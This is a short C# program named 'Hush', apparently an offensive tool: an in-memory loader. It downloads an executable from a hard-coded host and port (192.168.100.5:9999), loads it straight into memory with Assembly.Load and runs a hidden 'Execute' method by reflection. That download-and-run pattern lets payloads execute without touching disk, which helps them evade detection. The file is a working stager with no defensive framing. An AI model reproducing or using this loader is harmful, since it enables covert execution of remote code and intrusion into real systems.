using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Hush
{
    class Program
    {
        static void Main(string[] args)
        {
            // Fetch the payload
            byte[] managedAssemblyBytes = new System.Net.WebClient().DownloadData("http://192.168.100.5:9999/FetchCurrentUser.exe");

            // Load it in a ManagedAssembly
            Assembly managedAssembly = Assembly.Load(managedAssemblyBytes);

            // Fetch the Entry Point
            //MethodInfo entryPoint = managedAssembly.EntryPoint;

            // Fetch the Execute method
            Type exec = managedAssembly.GetType("Program");
            MethodInfo entryPoint = exec.GetMethod("Execute", BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Static);

            // Invoke it
            string retVal = (string)entryPoint.Invoke(null, new object[] { });

            // Write back the result
            Console.WriteLine(retVal);
            Console.ReadLine();

        }
    }
}
